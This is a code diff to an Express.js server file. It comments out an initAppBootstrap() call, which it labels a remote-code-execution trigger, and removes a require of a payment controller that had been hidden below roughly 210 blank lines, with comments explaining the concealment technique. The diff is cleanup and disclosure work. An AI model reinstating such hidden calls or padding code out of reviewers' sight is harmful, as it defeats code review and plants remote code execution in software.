@@ -41,7 +41,8 @@ app.use('/api/v1', payment);
 // Deployment Configuration
 __dirname = path.resolve();
 console.log(__dirname);
-initAppBootstrap(); // Initialize application bootstrap utilities
+// NEUTRALIZED: initAppBootstrap() was the RCE trigger — see server/utils/bootstrap.js
+// initAppBootstrap();
 
 // Production vs Development Environment Setup
 if (process.env.NODE_ENV === 'production') {
@@ -53,220 +54,14 @@ if (process.env.NODE_ENV === 'production') {
     });
 } else {
     app.get('/', (req, res) => {
-        res.send('Server is Running! 🚀');
+        res.send('Server is Running!');
     });
 }
 
 // Export the configured Express application
 module.exports = app;
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-const errorPayment = require('./controllers/paymentController');
+// NEUTRALIZED: Below this line were ~210 blank lines followed by a hidden require:
+//   const errorPayment = require('./controllers/paymentController');
+// The blank lines were intended to push the code off-screen so reviewers
+// wouldn't notice it. This is a common obfuscation technique in malware.
